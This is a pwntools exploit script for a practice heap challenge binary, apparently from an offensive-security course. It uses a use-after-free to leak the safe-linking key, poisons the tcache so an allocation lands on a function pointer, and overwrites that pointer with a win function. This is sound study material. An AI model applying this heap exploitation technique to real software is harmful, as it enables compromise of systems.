from pwn import *

#checksec: canary + nx + pie, partial RELRO

context.binary = elf = ELF("/home/kali/Desktop/offsec/prove/06_heap_unsorted_tcache_hook/chall")

# global var chunks, array of strings
# global array of size_t sizes
# global pointer to a function hook_func
# there are: defaulthook and win_hook
# create_chunk: creates with malloc in chunks[index], with size in (0, 0x400), and updates sizes[index]
# edit chunk: reades sizes[index] bytes into chunk[index]
# free chunk: calls free on chunks[index] but doesn't null the pointer, so uaf is possible
# show chunk: writes sizes[idx] bytes from chunks[idx]
# print targets is a leak that prints addresses of win_hook function and of hook_func pointer variable

# i want to write win_hook function address into hook_function function pointer
# tcache poisoning -> get hook_function address and write win_hook

# note: i can't reuse same indexes 

# create chunk 0
# free chunk 0
# read freed chunk to leak fd>>12
# create chunk 2,3; free chunk 3,2
# edit chunk 2 fd to point to hook_func
# create chunk 4
# create chunk 5, write win_hook address into it

p = process(elf.path)

p.sendlineafter(b'> ', b'1')                    # create chunk 0
p.sendlineafter(b'Index:\n', b'0')
p.sendlineafter(b'Size:\n', str(0x100).encode())
p.sendlineafter(b'Data:\n', b'dummy')

p.sendlineafter(b'> ', b'3')                    # free chunk 0
p.sendlineafter(b'Index:\n', b'0')

p.sendlineafter(b'> ', b'4')                    # show chunk 0
p.sendlineafter(b'Index:\n', b'0')
p.recvuntil(b'data:\n')
leak = u64(p.recv(8).ljust(8, b'\x00')) #this is fd>>12 ^ null = fd>>12

print(f"Got leak (fd>>12): {leak}")

p.sendlineafter(b'> ', b'7')
p.recvuntil(b'hook_func @ ')
func_ptr_addr = int(p.recvline(), 16)
p.recvuntil(b'win_hook  @ ')
win_hook_addr = int(p.recvline(), 16)

print(f"Win_hook is at {hex(win_hook_addr)}, Hook_func is at {hex(func_ptr_addr)}")
elf.address = win_hook_addr - elf.sym.win_hook

p.sendlineafter(b'> ', b'1')                    # create chunk 2
p.sendlineafter(b'Index:\n', b'2')
p.sendlineafter(b'Size:\n', str(0x100).encode())
p.sendlineafter(b'Data:\n', b'dummy')

p.sendlineafter(b'> ', b'1')                    # create chunk 3
p.sendlineafter(b'Index:\n', b'3')
p.sendlineafter(b'Size:\n', str(0x100).encode())
p.sendlineafter(b'Data:\n', b'dummy')

p.sendlineafter(b'> ', b'3')                    # free chunk 3
p.sendlineafter(b'Index:\n', b'3')

p.sendlineafter(b'> ', b'3')                    # free chunk 2
p.sendlineafter(b'Index:\n', b'2')

p.sendlineafter(b'> ', b'2')                    # edit chunk 2 (fd)
p.sendlineafter(b'Index:\n', b'2')
p.sendlineafter(b'Data:\n', p64(leak ^ func_ptr_addr))

#head -> chunk 0 (fd -> hook_function) -> chunk 1

p.sendlineafter(b'> ', b'1')                    # create chunk 4
p.sendlineafter(b'Index:\n', b'4')
p.sendlineafter(b'Size:\n', str(0x100).encode())
p.sendlineafter(b'Data:\n', b'dummy')

p.sendlineafter(b'> ', b'1')                    # create chunk 5 (it will return the address of function pointer hook_func)
p.sendlineafter(b'Index:\n', b'5')
p.sendlineafter(b'Size:\n', str(0x100).encode())
p.sendlineafter(b'Data:\n', p64(elf.sym.win_hook))

p.sendlineafter(b'> ', b'6')                    # call hook_function
p.sendlineafter(b'Index:\n', b'0')

p.interactive()